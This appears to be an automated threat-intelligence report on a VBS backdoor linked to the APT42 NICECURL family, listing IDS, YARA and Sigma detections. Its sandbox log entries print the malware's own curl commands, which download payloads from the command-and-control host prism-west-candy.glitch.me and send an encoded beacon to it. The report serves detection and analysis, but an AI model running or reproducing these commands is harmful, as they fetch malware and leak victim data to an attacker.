threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factors were that it matches yara rules with files that have detections and it could not be run in sandboxes.

crowdsourced_ids_results.rule_category: Domain Observed Used for C2 Detected
crowdsourced_ids_results.rule_msg: ET MALWARE APT42/TA453 NICECURL Backdoor Related CnC Domain in DNS Lookup (prism-west-candy .glitch .me)
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET MALWARE APT42/TA453 NICECURL Backdoor Related CnC Domain in DNS Lookup (prism-west-candy .glitch .me)"; dns.query; bsize:26; content:"prism-west-candy.glitch.me"; nocase; reference:url,cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations; classtype:domain-c2; sid:2052409; rev:1; metadata:attack_target Client_Endpoint, created_at 2024_05_06, deployment Perimeter, performance_impact Low, confidence High, signature_severity Major, updated_at 2024_05_06;)

crowdsourced_ids_results.rule_category: Domain Observed Used for C2 Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Observed APT42/TA453 NICECURL Backdoor Related Domain (prism-west-candy .glitch .me in TLS SNI)
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Observed APT42/TA453 NICECURL Backdoor Related Domain (prism-west-candy .glitch .me in TLS SNI)"; flow:established,to_server; tls.sni; bsize:26; content:"prism-west-candy.glitch.me"; fast_pattern; reference:url,cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations; classtype:domain-c2; sid:2052411; rev:1; metadata:attack_target Client_Endpoint, created_at 2024_05_06, deployment Perimeter, performance_impact Low, confidence High, signature_severity Major, updated_at 2024_05_06;)

crowdsourced_ids_results.rule_msg: ET HUNTING Suspicious Glitch Hosted DNS Request - Possible Phishing Landing
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET HUNTING Suspicious Glitch Hosted DNS Request - Possible Phishing Landing"; dns.query; content:".glitch.me"; pcre:"/^[a-z]+\-[a-z]+\-[a-z]+\.glitch\.me$/"; classtype:social-engineering; sid:2031918; rev:1; metadata:affected_product Web_Browsers, attack_target Client_Endpoint, created_at 2021_03_10, deployment Perimeter, former_category HUNTING, signature_severity Critical, tag Phishing, updated_at 2021_03_10, mitre_tactic_id TA0001, mitre_tactic_name Initial_Access, mitre_technique_id T1566, mitre_technique_name Phishing;)

crowdsourced_ids_results.rule_msg: ET HUNTING Suspicious Glitch Hosted TLS SNI Request - Possible Phishing Landing
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET HUNTING Suspicious Glitch Hosted TLS SNI Request - Possible Phishing Landing"; flow:established,to_server; tls.sni; content:".glitch.me"; endswith; pcre:"/^[a-z]+\-[a-z]+\-[a-z]+\.glitch\.me$/"; classtype:social-engineering; sid:2031919; rev:1; metadata:affected_product Web_Browsers, attack_target Client_Endpoint, created_at 2021_03_10, deployment Perimeter, former_category HUNTING, signature_severity Critical, tag Phishing, updated_at 2021_03_10, mitre_tactic_id TA0001, mitre_tactic_name Initial_Access, mitre_technique_id T1566, mitre_technique_name Phishing;)

alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:"PROTOCOL-ICMP Unusual PING detected"; icode:0; itype:8; fragbits:!M; content:!"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI",depth 32; content:!"0123456789abcdefghijklmnopqrstuv",depth 32; content:!"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",depth 36; content:!"WANG2"; content:!"cacti-monitoring-system",depth 65; content:!"SolarWinds",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )

crowdsourced_yara_results.description: VBS backdoor which bares architectural similarity to the POWERSTAR malware family.
crowdsourced_yara_results.author: threatintel@volexity.com

crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: VBS backdoor which bares architectural similarity to the POWERSTAR malware family.
crowdsourced_yara_results.author: threatintel@volexity.com

sigma_analysis_results.rule_description: Detects the attempts of some threat actors to drop Cobalt Strike into a victim machine via Microsoft Word macros.
Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.

match_context.values: @{EventID=1; Image=cmd; CommandLine=cmd /C start /MIN curl --ssl-no-revoke -s -d id=CgYEFk&Prog=Form.pdf&WH=Form.pdf -X POST https://prism-west-candy.glitch.me/Down -o C:\Users\<USER>\AppData\Local\Temp/Form.pdf}

@{EventID=1; Product=Microsoft\xae Windows\xae Operating System; ParentImage=C:\Windows\System32\wscript.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); CurrentDirectory=C:\Windows\system32\; Company=Microsoft Corporation; IntegrityLevel=Medium; ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\george\Desktop\down.vbs"; CommandLine=cmd /C start /MIN curl --ssl-no-revoke -s -d "id=CgYEFk&Prog=Form.pdf&WH=Form.pdf" -X POST https://prism-west-candy.glitch.me/Down -o C:\Users\george\AppData\Local\Temp/Form.pdf; Hashes=SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; Image=C:\Windows\System32\cmd.exe; OriginalFileName=Cmd.Exe; Description=Windows Command Processor}

@{EventID=1; Product=Microsoft\xae Windows\xae Operating System; ParentImage=C:\Windows\System32\wscript.exe; Description=Windows Command Processor; CurrentDirectory=C:\Windows\system32\; Image=C:\Windows\System32\cmd.exe; Company=Microsoft Corporation; IntegrityLevel=Medium; ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\george\Desktop\down.vbs"; Hashes=SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; CommandLine=cmd /C start /MIN curl --ssl-no-revoke -s -d "id=CgYEFk&Prog=nicecmd.exe" -X POST https://prism-west-candy.glitch.me/Down -o C:\Users\george\AppData\Local\Temp/nicecmd.exe; OriginalFileName=Cmd.Exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800)}

sigma_analysis_results.rule_description: Detects a suspicious curl process start on Windows and outputs the requested document to a local file
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{EventID=1; Product=The curl executable; ParentImage=C:\Windows\System32\cmd.exe; Description=The curl executable; CurrentDirectory=C:\Windows\system32\; Company=curl, https://curl.haxx.se/; IntegrityLevel=Medium; ParentCommandLine=cmd /C start /MIN curl --ssl-no-revoke -s -d "id=CgYEFk&Prog=Form.pdf&WH=Form.pdf" -X POST https://prism-west-candy.glitch.me/Down -o C:\Users\george\AppData\Local\Temp/Form.pdf; CommandLine=curl  --ssl-no-revoke -s -d "id=CgYEFk&Prog=Form.pdf&WH=Form.pdf" -X POST https://prism-west-candy.glitch.me/Down -o C:\Users\george\AppData\Local\Temp/Form.pdf; Hashes=SHA1=B073B1B84A589B7FEFD380AE9E097C3040E4DD07,MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92; Image=C:\Windows\System32\curl.exe; OriginalFileName=curl.exe; FileVersion=7.55.1}

sigma_analysis_results.rule_description: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{EventID=1; Product=NirCmd; ParentImage=C:\Windows\System32\wscript.exe; Description=NirCmd; CurrentDirectory=C:\Windows\system32\; Company=NirSoft; IntegrityLevel=Medium; ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\george\Desktop\down.vbs"; CommandLine=C:\Users\george\AppData\Local\Temp/nicecmd.exe execmd curl --ssl-no-revoke -s -d "N=ODc5MDM1OztlZ3JvZWc7O2tGRVlnQzs7b3JQIDAxIHN3b2RuaVcgdGZvc29yY2lN_VB" -X POST https://prism-west-candy.glitch.me -o C:\Users\george\AppData\Local\Temp/sess.txt; Hashes=SHA1=20CD453FCAC9D9960B0076715D985A55784A6B53,MD5=5ED4728CAA339C2A7479102F0C04C087,SHA256=7160DB2B7A6680480E64F0845512D203A575F807831FAF9A652AAEF0988F876C,IMPHASH=52B115A47FFAE378901264C3506742B0; Image=C:\Users\george\AppData\Local\Temp\nicecmd.exe; OriginalFileName=NirCmd.exe; FileVersion=2.86}

sigma_analysis_results.rule_author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger
